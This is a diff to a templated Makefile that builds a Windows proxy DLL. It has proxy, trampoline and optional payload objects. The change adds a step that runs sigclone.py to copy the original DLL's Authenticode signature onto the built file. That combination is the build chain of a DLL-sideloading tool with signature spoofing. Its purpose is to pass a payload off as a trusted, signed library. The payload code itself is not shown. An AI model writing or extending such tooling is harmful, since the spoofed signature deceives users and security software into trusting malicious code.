@@ -15,7 +15,7 @@ OBJECTS = proxy.o trampolines.o
 {% if payload_enabled %}
 OBJECTS += payload.o
 {% endif %}
-{% if embed_enabled %}
+{% if has_resources %}
 OBJECTS += resource.o
 {% endif %}
 
@@ -23,6 +23,10 @@ all: $(TARGET)
 
 $(TARGET): $(OBJECTS)
 	$(CC) $(CFLAGS) -o $@ $^ $(DEF) -lkernel32 -luser32
+{% if has_signature %}
+	@echo [*] Cloning Authenticode signature...
+	@python sigclone.py "{{ original_dll_filename }}" "$(TARGET)" || echo [!] Signature cloning failed (non-fatal)
+{% endif %}
 
 proxy.o: proxy.c proxy.h
 	$(CC) $(CFLAGS) -c -o $@ $<
@@ -35,7 +39,7 @@ payload.o: payload.c payload.h
 trampolines.o: trampolines.S
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-{% if embed_enabled %}
+{% if has_resources %}
 resource.o: resource.rc resource.h
 	$(WINDRES) $< $@
 
